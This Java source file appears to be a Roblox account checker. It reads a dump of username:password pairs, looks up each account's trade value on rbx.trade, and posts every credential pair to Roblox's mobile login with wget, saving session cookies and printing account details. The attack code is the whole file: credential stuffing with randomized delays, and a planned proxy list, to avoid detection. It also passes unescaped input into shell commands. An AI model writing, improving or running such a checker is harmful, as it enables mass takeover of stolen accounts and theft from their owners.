import java.util.*;
import java.io.*;

// TODO: add option to check if user exists, proxy list & resume/save option.

public class jrasc {
	
	public static int constant1 = 17;
	public static int constant2 = 31;
	public static int constant3 = 3;
	public static int constant4 = 4;
	public static int constant5 = 7;
	public static int constant6 = 0;
	
	public static void main (String args[]) {
		
		// Check if enough args!
		
		// Args ex: 0 dump.txt : : 0 0 1 1 17 31 1
		
		int displayProgramStatus = Integer.parseInt(args[0]);
		if (displayProgramStatus == 1)
			System.out.println("SOP");
		String proxyList = ""; // Add arguments to wget;
		String accountList = args[1];
		String seperatingCharacterPrint = args[2];
		String seperatingCharacterAccounts = args[3];
		int displayRAPOption = Integer.parseInt(args[4]);
		int ignoreOnError = Integer.parseInt(args[5]);
		int displayErrors = Integer.parseInt(args[6]);
		int waitTime = Integer.parseInt(args[7]);
		constant1 = Integer.parseInt(args[8]);
		constant2 = Integer.parseInt(args[9]);
		int checkOnlyRap = Integer.parseInt(args[10]);
		try{
			String store[] = new String[2];
			String tmp;
			BufferedReader ac = new BufferedReader(new FileReader(accountList));
			while((tmp=ac.readLine()) != null){
				store=tmp.split(seperatingCharacterAccounts);
				accountCheck(seperatingCharacterPrint, displayRAPOption, store[0], store[1],ignoreOnError,displayErrors,waitTime,checkOnlyRap);
			}
			ac.close();
		}
		catch (Exception e){
			if (displayErrors == 1)
				System.out.println("0 ERROR: "+e);
		}
		if (displayProgramStatus == 1)
			System.out.println("EOP");
	}
	
	private static void accountCheck(String seperatingCharacterPrint, int displayRAPOption, String user, String password, int ignoreOnError, int displayErrors, int waitTime, int checkOnlyRap){
		boolean exceptionCounter = false;
		
		do{
			Runtime rt = Runtime.getRuntime();
			try{
				Process proc = rt.exec(String.format("wget -q -w "+waitTime+" --random-wait -nv http://rbx.trade/s/"+user+"/ajax"));
				proc.waitFor();
			}
			catch (Exception e){
				if (displayErrors == 1)
					System.out.println("1 ERROR: "+e);
				exceptionCounter = true;
			}
			// 29 1000$ 31 1K$ RAP
			
			try{
				String tmp[] = new String[31];
				BufferedReader br = new BufferedReader(new FileReader("ajax"));
				tmp=br.readLine().split(">");
				if (displayRAPOption == 2)
					System.out.print(tmp[constant2].split("<")[constant6]+seperatingCharacterPrint);
				else
					System.out.print(tmp[constant1].split("<")[constant6]+seperatingCharacterPrint);
				
				br.close();
			}
			catch (Exception e){
				if (displayErrors == 1)
					System.out.println("2 ERROR: "+e);
				exceptionCounter = true;
			}
			try{
				Process proc = rt.exec("rm ajax");
				proc.waitFor();
			}
			catch (Exception e){
				if (displayErrors == 1)
					System.out.println("3 ERROR: "+e);
				if (ignoreOnError == 1)
					break;
			}
			
			if (checkOnlyRap!=1){
				try{
					Process proc = rt.exec(String.format("wget -q -w "+waitTime+" --random-wait -nv --delete-after --save-cookies cookies --keep-session-cookies  --post-data username=%s&password=%s https://m.roblox.com/Login",user,password));
					proc.waitFor();
					proc = rt.exec("wget -q -w "+waitTime+" --random-wait -nv --load-cookies cookies https://www.roblox.com/mobileapi/userinfo?nl=true");
					proc.waitFor();
				}
				catch (Exception e){
					if (displayErrors == 1)
						System.out.println("4 ERROR: "+e);
					exceptionCounter = true;
				}
				
				try{
					String tmp[] = new String[31];
					BufferedReader br = new BufferedReader(new FileReader("userinfo?nl=true"));
					System.out.print(br.readLine());
					//tmp=br.readLine().split(":");
					//System.out.print(tmp[constant3].split(",")[constant6]+seperatingCharacterPrint);
					//System.out.print(tmp[constant4].split(",")[constant6]+seperatingCharacterPrint);
					//System.out.print(tmp[constant5].split("}")[constant6]+seperatingCharacterPrint);
					
					br.close();
				}
				catch (Exception e){
					if (displayErrors == 1)
						System.out.println("5 ERROR: "+e);
					exceptionCounter = true;
				}
				try{
					Process proc = rt.exec("rm cookies");
					proc.waitFor();
				}
				catch (Exception e){
					if (displayErrors == 1)
						System.out.println("6 ERROR: "+e);
					exceptionCounter = true;
				}
				try{
					Process proc = rt.exec("rm userinfo?nl=true");
					proc.waitFor();
				}
				catch (Exception e){
					if (displayErrors == 1)
						System.out.println("7 ERROR: "+e);
					if (ignoreOnError == 1)
						break;
				}
			}
		}while(false);
		System.out.println(user+seperatingCharacterPrint);
	}
}
